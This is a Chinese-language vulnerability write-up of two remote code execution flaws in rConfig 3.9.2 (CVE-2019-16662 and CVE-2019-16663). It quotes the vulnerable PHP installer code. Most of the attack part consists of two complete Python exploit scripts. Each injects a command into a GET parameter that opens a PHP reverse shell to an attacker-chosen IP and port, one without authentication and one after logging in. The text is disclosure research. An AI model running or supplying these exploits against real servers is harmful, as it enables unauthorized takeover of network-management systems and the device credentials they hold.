## rConfig v3.9.2 RCE漏洞

## 0x00 前言

rConfig是一个开源网络设备配置管理解决方案，可以方便网络工程师快速、频繁管理网络设备快照。

我在rConfig的两个文件中找到了两个远程命令执行（RCE）漏洞，第一个文件为`ajaxServerSettingsChk.php`，攻击者可以通过`rootUname`参数发送精心构造的一个GET请求，触发未授权RCE漏洞。`rootUname`参数在源文件第2行中定义，随后会在第13行传递给`exec`函数。攻击者可以将恶意系统命令插入该参数中，在目标服务器上执行。该漏洞利用和发现过程比较简单，下文中我将介绍如何发现并利用该漏洞。

第二个漏洞位于`search.crud.php`文件中，存在RCE漏洞。攻击者可以发送精心构造的GET请求触发该漏洞，请求中包含两个参数，其中`searchTerm`参数可以包含任意值，但该参数必须存在，才能执行到第63行的`exec`函数。

我像往常一样想寻找RCE漏洞，因此我使用自己开发的一个[python脚本](https://github.com/mhaskar/RCEScanner)来搜索所有不安全的函数。

## 0x01 未授权RCE漏洞

运行脚本后，我看到了一些输出结果。检查文件后，我发现有个文件名为`ajaxServerSettingsChk.php`，具体路径为`install/lib/ajaxHandlers/ajaxServerSettingsChk.php`，部分代码如下：

```php
<?php
$rootUname = $_GET['rootUname'];    // line 2
$array = array();
/* check PHP Safe_Mode is off */
if (ini_get('safe_mode')) {
    $array['phpSafeMode'] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;bad&amp;amp;quot;&amp;amp;gt;Fail - php safe mode is on - turn it off before you proceed with the installation&amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;br/&amp;amp;gt;';
} else {
    $array['phpSafeMode'] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;Good&amp;amp;quot;&amp;amp;gt;Pass - php safe mode is off&amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;';
}

/* Test root account details */
$rootTestCmd1 = 'sudo -S -u ' . $rootUname . ' chmod 0777 /home 2&amp;amp;gt;&amp;amp;amp;1';    // line 12
exec($rootTestCmd1, $cmdOutput, $err);    // line 13
$homeDirPerms = substr(sprintf('%o', fileperms('/home')), -4);
if ($homeDirPerms == '0777') {
    $array['rootDetails'] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;Good&amp;amp;quot;&amp;amp;gt;Pass - root account details are good &amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;';
} else {
    $array['rootDetails'] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;bad&amp;amp;quot;&amp;amp;gt;The root details provided have not passed: ' . $cmdOutput[0] . '&amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;';
}
// reset /home dir permissions
$rootTestCmd2 = 'sudo -S -u ' . $rootUname . ' chmod 0755 /home 2&amp;amp;gt;&amp;amp;amp;1';    // line 21
exec($rootTestCmd2, $cmdOutput, $err);    // line 22

echo json_encode($array);
```

## POC x1

```python
#!/usr/bin/python

# Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution
# Date: 18/09/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2019-16662
# Vendor Homepage: https://rconfig.com/
# Software link: https://rconfig.com/download
# Version: v3.9.2
# Tested on: CentOS 7.7 / PHP 7.2.22

import requests
import sys
from urllib import quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 4:
    print "[+] Usage : ./exploit.py target ip port"
    exit()

target = sys.argv[1]

ip = sys.argv[2]

port = sys.argv[3]

payload = quote(''';php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'#'''.format(ip, port))

install_path = target + "/install"

req = requests.get(install_path, verify=False)
if req.status_code == 404:
    print "[-] Installation directory not found!"
    print "[-] Exploitation failed !"
    exit()
elif req.status_code == 200:
    print "[+] Installation directory found!"
url_to_send = target + "/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=" + payload

print "[+] Triggering the payload"
print "[+] Check your listener !"

requests.get(url_to_send, verify=False)

```

## POC x2

```python
#!/usr/bin/python

# Exploit Title: rConfig v3.9.2 Authenticated Remote Code Execution
# Date: 18/09/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2019-16663
# Vendor Homepage: https://rconfig.com/
# Software link: https://rconfig.com/download
# Version: v3.9.2
# Tested on: CentOS 7.7 / PHP 7.2.22


import requests
import sys
from urllib import quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 6:
    print "[+] Usage : ./exploit.py target username password ip port"
    exit()

target = sys.argv[1]

username = sys.argv[2]

password = sys.argv[3]

ip = sys.argv[4]

port = sys.argv[5]

request = requests.session()

login_info = {
    "user": username,
    "pass": password,
    "sublogin": 1
}

login_request = request.post(
    target+"/lib/crud/userprocess.php",
     login_info,
     verify=False,
     allow_redirects=True
 )

dashboard_request = request.get(target+"/dashboard.php", allow_redirects=False)


if dashboard_request.status_code == 200:
    print "[+] LoggedIn successfully"
    payload = '''""&amp;&amp;php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'#'''.format(ip, port)
    encoded_request = target+"/lib/crud/search.crud.php?searchTerm=anything&amp;catCommand={0}".format(quote(payload))
    print "[+] triggering the payload"
    print "[+] Check your listener !"
    exploit_req = request.get(encoded_request)

elif dashboard_request.status_code == 302:
    print "[-] Wrong credentials !"
    exit()
```

### 原文： https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/ 

### 英译中： https://www.anquanke.com/post/id/189795 

### PDF版本：[本地：rConfig v3.9.2 RCE漏洞分析.pdf](./books/rConfig%20v3.9.2%20RCE漏洞分析.pdf)

